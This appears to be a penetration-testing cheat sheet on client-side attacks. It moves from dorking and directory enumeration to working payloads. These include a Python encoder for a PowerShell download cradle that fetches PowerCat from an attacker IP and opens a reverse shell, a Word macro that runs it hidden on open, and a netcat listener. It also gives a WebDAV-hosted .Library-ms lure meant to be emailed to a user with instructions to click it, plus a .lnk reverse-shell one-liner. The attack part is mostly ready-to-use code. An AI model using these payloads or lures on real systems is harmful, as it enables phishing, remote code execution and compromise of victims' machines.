# Client-side attacks

## Dorking

Passive: 
- browser: `site:www.site-to-hack.com filetype:pdf`
- cli: `kali$ firefox --search "Microsoft Edge site:exploit-db.com`, `inurl:`, `intext:`, `intitle:`
Gobuster: 
- `gobuster dir -x pdf -u $TargetIp -w /usr/share/wordlist/dirb/common.txt`
- `gobuster dir -x .pdf, .txt -u $TargetIp -w /usr/share/wordlist/dirb/big.txt`
Exiftool: `exiftool -a -u somefile.pdf`

## Macros

### Word

Start a listener:
```
kali$ nc -lnvp $AttackerPort
```
base64 encode a PowerShell reverse shell, or a download cradle for [PowerCat](https://github.com/besimorhino/powercat):
```
import base64

text = "IEX(New-Object System.Net.WebClient).DownloadString('http://$AttackerIp/powercat.ps1');powercat -c $AttackerIp -p $AttackerPort -e powershell"

payload = base64.b64encode(bytes(text, 'utf-16-le')).decode('utf-8') # WARNING: Windows uses UTF-16-LE encoding...

print("PowerCat cradle:", text)
print("Payload, base64 utf-16-le encoded:", payload)

n = 50 

print("Str = \"powershell.exe -nop -w hidden -e \"")
for i in range(0, len(payload), n):
    print("Str = Str + " + '"' + payload[i:i+n] + '"')
```
embed it in Word macro:
```
Sub AutoOpen()
  MyMacro
End Sub
Sub Document_Open()
  MyMacro
End Sub
Sub MyMacro()
  '-----
  'CreateObject("Wscript.Shell").Run "powershell"
  '-----
  Dim Str As String
  Str = "powershell.exe -nop -w hidden -enc "
  Str += Str + "some"
  Str += Str + "long"
  Str += Str + "base64"
  Str += Str + "utf-16-le"
  Str += Str + "string"
  CreateObject("Wscript.Shell").Run Str
End Sub
```
and start an http server:
```
kali$ python3 -m http.server 80
```

### Library files

#### Webdav shares

Install and run a Webdav share:
```
kali$ sudo apt-get install python3-wsgidav
kali$ wsgidav --host=0.0.0.0 --port=80 --auth=anonymous --root /path/to/webdav/share/
```

#### Extension `.Library-ms`

Make a `myautomatedfakeinstalltofoolsomeuser.Library-ms` file pointing to the Webdav share on Kali, send it by mail and tell the user to click it. \
In the Webdav share, prepare a reverse shell. For example with [PowerCat](https://raw.githubusercontent.com/besimorhino/powercat/master/powercat.ps1) in a `.lnk` file:
```
powershell.exe -c "IEX(New-Object System.Net.WebClient).DownloadString('http://myip:myhttpport/powercat.ps1');powercat -c myip -p myncport -e powershell"
```
Instead of sending the Library file by email, it can be shared by Samba:
```
smbclient //$TargetIp/$TargetSharedDirectory -c 'put myautomatedfakeinstalltofoolsomeuser.Library-ms.Library-ms'
```


